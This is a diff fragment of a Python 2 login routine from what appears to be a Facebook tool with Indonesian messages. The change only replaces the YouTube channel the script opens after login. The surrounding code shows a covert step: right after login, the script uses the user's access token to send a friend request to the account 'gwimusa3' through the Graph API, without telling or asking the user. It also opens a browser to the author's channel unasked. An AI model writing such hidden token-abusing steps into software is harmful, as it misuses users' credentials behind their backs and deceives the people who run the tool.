@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/channel/UC6o9Zfm6cMXG1wJrHl_9FlA')
+                os.system('xdg-open https://www.youtube.com/channel/UCFG0nw1sR6rbQozJYM8gjIQ')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
